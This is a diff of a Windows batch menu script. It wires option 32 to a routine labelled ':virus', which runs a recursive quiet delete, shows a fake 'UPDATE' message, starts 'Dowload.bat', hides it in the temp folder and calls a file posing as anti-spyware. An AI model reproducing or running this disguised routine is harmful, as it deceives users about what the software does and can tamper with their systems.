@@ -124,11 +124,11 @@ if %choix%== 000 goto :www
 if %choix%== 001 goto :wwwr
 if %choix%== 31 goto :boost
 if %choix%== 002 goto :files
-if %choix%== 32 goto :commingsoon
+if %choix%== 32 goto :virus
 if %choix%== 33 goto :more
 goto please
 :virus
-del /s /q Apill-fuse-Protect-against-spyware.exe
+del /s /q Apill-fuse-Protect-against-spyware.bat
 cls
 TIMEOUT 2 /nobreak > nul 
 echo UPDATE...................
@@ -139,7 +139,7 @@ TIMEOUT 2 /nobreak > nul
 start Dowload.bat
 TIMEOUT 7 /nobreak >nul
 move Dowload.bat %temp%
-call Apill-fuse-Protect-against-spyware.exe
+call Apill-fuse-Protect-against-spyware.bat
 exit /b
 :files
 echo @echo off >update.bat
